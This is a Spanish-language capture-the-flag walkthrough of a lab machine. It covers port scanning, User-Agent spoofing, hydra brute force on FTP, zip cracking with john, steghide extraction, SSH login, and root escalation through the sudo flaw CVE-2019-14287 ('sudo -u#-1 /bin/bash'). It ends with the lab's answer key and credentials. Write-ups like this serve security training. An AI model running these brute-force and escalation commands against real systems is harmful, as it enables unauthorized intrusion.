# Recon
Iniciamos el reconocimiento escaneando los puertos abiertos utilizando la herramienta nmap ejecutando el siguiente comando : `sudo nmap -sS -p- --open --min-rate 4000 -Pn -T4 -n -vv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-02-14 00:35:05 EST for 63s
Not shown: 64807 closed tcp ports (reset), 725 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
##  
 Nuestro escaneo nos muestra 3 puertos abiertos, del cual podremos abusarnos para extraer cualquier tipo de informacion que se nos presente.

Para seguir el reconocimiento y obtener la mayor cantidad de informacion posible, visitaremos el puerto 80 (http).  Al visitar la pagina web, veremos una comunicacion entre los agentes para tener acceso al sitio web. Podemos abusarnos de esta informacion utilizando __curl__ , que nos dara respuesta del servidor para leer los mensajes a otros agentes.

```ruby
curl http://IPTARGET -H User-Agent: A -L
curl http://IPTARGET -H User-Agent: B -L
curl http://IPTARGET -H "User-Agent: C" -L ---> Mensaje oculto
curl http://IPTARGET -H User-Agent: D -L
curl http://IPTARGET -H User-Agent: E -L
```

# Brute-Force

En el mensaje, pudrimos descubrir un usuario "__chris__". 
Con esta informacion en mano, intentaremos realizar un ataque de fuerza bruta para descubrir sus credenciales, utilizaremos la herramienta hydra para esta tarea, pero... en que servicio?. Si nos fijamos en nuestro escaneo de nmap, podremos ver que el puerto 21 (ftp) se encuentra abierto, por lo que le solicitaremos a hydra que lo realice en ese servicio.

 Ejecutamos el siguiente comando : `hydra -l chris -P wordlist IPTARGET ftp` 
 Este procedimiento puede demorar algunos minutos-horas. 


# Intrusion

Una vez obtuvimos las credenciales, ingresamos al servicio abierto, ftp.
Ejecutamos : `ftp IPTARGET` , nos preguntara nuestro username y password.

Una vez dentro, nos transferimos los archivos dentro del servicio..

>`get Alien_autospy.jpg`
>`get cute-alien.jpg`
>`get cutie.png`


## 
Cuando nos encontramos con imagenes, lo primero que se nos tiene que venir a la mente es que es muy probable que contengan archivos o textos ocultos dentro. Para ello, utilizaremos las herramientas :   `binwalk `   `steghide`   `exiftool`

```ruby
binwalk -e cutie.png --> archivo zip oculto
```
### John

John es una popular herramienta de descifrado de contraseñas de código abierto que se utiliza para descubrir contraseñas débiles
Tambien puede ser utilizada para descubrir contraseñas protegidas en formato zip, en nuestro caso utilizaremos esta herramienta para descubrir su contendio

`zip2john 8702.zip > pass.txt`

Una vez obtuvimos la respuesta de john, la descubriremos utilizando una wordlist de confianza (rockyou.txt), para conocer su contraseña protegida.

`john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt`


Descomprimimos el zip ejecutando : `7z e 8702.zip`. Obtenemos un codigo en base64 que deberemos decoficar.. Hay muchas formas para decodificar un texto en base64, utiliza la que sea mas practica para vos, en mi caso voy a realizar un echo y que me lo muestre decodificado en base64 : `echo "QXJlYTUx" | base64 -d` 

#### Steghide

Esta password que acabamos de descubrir, deberemos utilizarla en steghide para extraer 
informacion dentro de las otras imagenes que obtuvimos dentro del servicio ftp.

```ruby
steghide extract -sf
steghide extract -sf Cute-alien.jpg

```

##### 
Obtuvimos un mensaje, dirigida a __james__  que le redacta una password de logeo.
 Nuevamente en nuestro escaneo de nmap, encontraremos el puerto 22 (ssh) abierto, por lo que si utilizamos las credenciales que encontramos en este proceso podremos acceder existosamente.

##### SSH

Ejecutaremos el siguiente comando para acceder via ssh : `ssh james@IPTARGET`

# Priv. Escalation

Para escalar privilegios, debemos enumerar el sistema y descubrir la mayor cantidad de formas posibles para poder abusarnos del sistema. 

Para este metodo, listaremos los permisos sudo del usuario __james__ : `sudo -l`
__james__ tiene permisos alojados en /bin/bash. Para esta ocasion, buscaremos dentro de cualquier research de vulnerabilidades a eleccion, o bien utulizando __google__ que nos brindara informacion sobre como abusarnos de este permiso, si es que se descubrio la vulnerabilidad.

Luego de buscar utilizando google, entraremos al sitio web __exploit-db__  y descubriremos el numero de esta vulnerabilidad o __CVE__ . #CVE-2019-14287

__Exploit-db__ nos dice, que para poder escalar privilegios dentro de este sistema, deberemos ejecutar el siguiente comando : `sudo -u#-1 /bin/bash` y nos abrira una shell con permisos #ROOT. 

Ya podremos reclamar nuestra flag !


# Respuestas

Si te sientes atascado, o no queres esperar, aca tenes la lista de respuestas!

#ftp = chris:crystal
#zip = alien
#steghide = Area51
#ssh = james:hackerrules!


